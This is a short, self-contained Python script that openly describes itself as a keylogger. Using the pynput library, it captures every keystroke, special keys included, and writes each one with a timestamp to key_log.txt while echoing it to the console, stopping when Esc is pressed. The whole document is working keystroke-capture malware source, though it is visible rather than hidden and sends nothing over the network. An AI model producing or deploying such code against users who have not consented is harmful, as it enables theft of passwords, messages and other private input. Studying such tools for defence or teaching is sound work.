from pynput.keyboard import Key, Listener
import logging
import os

# Define the full path for the log file
log_file = os.path.join(os.getcwd(), "key_log.txt")

# Print the path where the log will be saved
print(f"[+] Keylog will be saved to: {log_file}")

# Setup logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define what to do on key press
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
        print(f"[Key]: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
        print(f"[Special Key]: {key}")

# Stop the listener on Esc key
def on_release(key):
    if key == Key.esc:
        print("[+] Esc pressed. Stopping...")
        return False

# Start the keylogger
print("[*] Starting keylogger. Press Esc to stop.\n")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
